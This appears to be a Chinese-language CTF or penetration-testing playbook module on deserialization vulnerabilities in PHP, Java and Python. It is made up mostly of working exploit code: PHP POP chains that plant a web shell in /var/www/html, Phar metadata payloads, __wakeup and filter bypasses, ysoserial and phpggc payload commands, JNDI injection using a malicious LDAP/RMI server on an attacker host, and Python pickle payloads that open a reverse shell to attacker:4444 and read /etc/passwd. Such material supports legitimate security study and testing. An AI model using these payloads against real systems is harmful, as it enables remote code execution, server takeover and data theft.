# 🔄 反序列化漏洞模块

## 适用场景
- PHP unserialize()
- Java ObjectInputStream
- Python pickle
- 对象传输、Session 存储

## 检查清单

```yaml
语言/框架:
  - [ ] PHP 反序列化
  - [ ] Java 反序列化
  - [ ] Python pickle
  - [ ] Ruby Marshal
  - [ ] .NET BinaryFormatter

识别特征:
  - [ ] base64 编码的对象数据
  - [ ] serialize 参数
  - [ ] 二进制数据流
  - [ ] 特定 Magic Bytes

利用工具:
  - [ ] ysoserial (Java)
  - [ ] phpggc (PHP)
  - [ ] 手工构造 POC
```

## PHP 反序列化

### Step 1: 基础概念

```php
// 序列化
$obj = new User("admin");
$serialized = serialize($obj);
// O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化
$obj = unserialize($serialized);

// 魔术方法（自动调用）
__construct()   // 创建对象时
__destruct()    // 对象销毁时
__wakeup()      // unserialize() 时
__sleep()       // serialize() 时
__toString()    // 对象转字符串时
__call()        // 调用不存在的方法时
__get()         // 读取不存在的属性时
__set()         // 写入不存在的属性时
__invoke()      // 对象作为函数调用时
```

### Step 2: POP 链构造

```php
<?php
// 示例：寻找利用链

class FileHandler {
    public $filename;
    public $content;
    
    function __destruct() {
        // 危险操作：写文件
        file_put_contents($this->filename, $this->content);
    }
}

// 构造恶意对象
$exploit = new FileHandler();
$exploit->filename = "/var/www/html/shell.php";
$exploit->content = "<?php system(\$_GET['cmd']); ?>";

echo serialize($exploit);
// O:11:"FileHandler":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:32:"<?php system($_GET['cmd']); ?>";}
?>
```

### Step 3: 常见利用链

```php
<?php
// 链式调用示例

class A {
    public $obj;
    function __destruct() {
        $this->obj->action();  // 调用 obj 的 action 方法
    }
}

class B {
    public $cmd;
    function action() {
        system($this->cmd);  // 危险操作
    }
}

// 构造利用链
$b = new B();
$b->cmd = "id";
$a = new A();
$a->obj = $b;

echo serialize($a);
// 当 unserialize 后，$a销毁时会触发链式调用
?>
```

### Step 4: 绕过 __wakeup()

```php
// CVE-2016-7124: PHP 5.x < 5.6.25, 7.x < 7.0.10

// 原理：当序列化字符串中属性个数大于实际个数时，__wakeup() 不会被调用

// 原始序列化
O:4:"Test":1:{s:4:"name";s:5:"admin";}

// 绕过 __wakeup - 修改属性个数为2
O:4:"Test":2:{s:4:"name";s:5:"admin";}
```

### Step 5: 绕过过滤

```php
// 绕过 "O:" 过滤
// 使用数组包装
a:1:{i:0;O:4:"Test":1:{s:4:"name";s:5:"admin";}}

// 使用 + 号
O:+4:"Test":1:{s:4:"name";s:5:"admin";}

// 大写绕过（部分情况）
// 使用 Unicode 或编码

// 16进制属性名
O:4:"Test":1:{S:4:"\6e\61\6d\65";s:5:"admin";}
```

### Step 6: Phar 反序列化

```php
<?php
// Phar 文件的 metadata 会被自动反序列化

class Evil {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

// 生成 phar 文件
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$evil = new Evil();
$evil->cmd = "id";
$phar->setMetadata($evil);

$phar->stopBuffering();

// 触发点（无需 unserialize）
file_exists("phar://evil.phar/test.txt");
file_get_contents("phar://evil.phar/test.txt");
include("phar://evil.phar/test.txt");
// 以及其他文件操作函数
?>
```

## Java 反序列化

### Step 1: 识别特征

```yaml
识别方式:
  二进制数据:
    - 以 AC ED 00 05 开头 (ObjectOutputStream)
    - Base64 解码后以 rO0AB 开头
    
  常见参数:
    - viewstate
    - session
    - token
    - _facesViewState (JSF)
```

### Step 2: ysoserial 使用

```bash
# 列出可用 Gadget
java -jar ysoserial.jar

# 生成 payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,base64编码的命令}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 编码
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# 常用 Gadget
CommonsCollections1-7  # Apache Commons Collections
JRMPClient             # RMI
URLDNS                 # 无害检测
```

### Step 3: Framework-Specific Exploitation

> For Shiro RememberMe, Fastjson, Log4j, WebLogic detailed exploitation, see [java.md](java.md)

### Step 4: JNDI Injection

```bash
# 启动恶意 LDAP/RMI 服务器
java -jar JNDIExploit.jar -i 你的IP

# 触发
rmi://attacker:1099/Exploit
ldap://attacker:1389/Exploit

# 通过日志、反序列化等触发 JNDI 查询
```

## Python 反序列化

### Step 1: pickle 序列化

```python
#!/usr/bin/env python3
import pickle
import os

class Evil:
    def __reduce__(self):
        # __reduce__ 返回可调用对象和参数
        return (os.system, ('id',))

# 生成 payload
payload = pickle.dumps(Evil())
print(payload)

# Base64 编码
import base64
print(base64.b64encode(payload).decode())

# 反序列化触发
# pickle.loads(payload)
```

### Step 2: 复杂 payload

```python
#!/usr/bin/env python3
import pickle

# 反弹 shell
class ReverseShell:
    def __reduce__(self):
        import os
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"',))

# 读取文件
class ReadFile:
    def __reduce__(self):
        return (eval, ("open('/etc/passwd').read()",))

# exec 执行
class Exec:
    def __reduce__(self):
        return (exec, ("import os; os.system('id')",))
```

## 常见套路与解法

### 套路 1: PHP 基础反序列化

**特征**: 直接 unserialize

**解法**: 构造 POP 链
```php
$payload = 'O:4:"Evil":1:{s:3:"cmd";s:2:"id";}';
```

### 套路 2: Phar 触发

**特征**: 文件操作函数可控

**解法**: 上传 phar 文件，用 phar:// 触发
```
file_exists("phar://uploads/evil.jpg/test.txt")
```

### 套路 3: Java 框架反序列化

**特征**: 使用 Commons Collections 等库

**解法**: 使用 ysoserial 生成对应 gadget

### 套路 4: Session 反序列化

**特征**: Session 使用序列化存储

**解法**: 构造恶意 Session 数据

## 工具速查

```bash
# PHP
phpggc -l                        # 列出可用链
phpggc Laravel/RCE1 system id    # 生成 payload

# Java
java -jar ysoserial.jar CommonsCollections1 "id"

# Python
python -c "import pickle,os; print(pickle.dumps(type('x', (), {'__reduce__': lambda s: (os.system, ('id',))})().__reduce__()))"

# 在线工具
# https://github.com/frohoff/ysoserial
# https://github.com/ambionics/phpggc
```
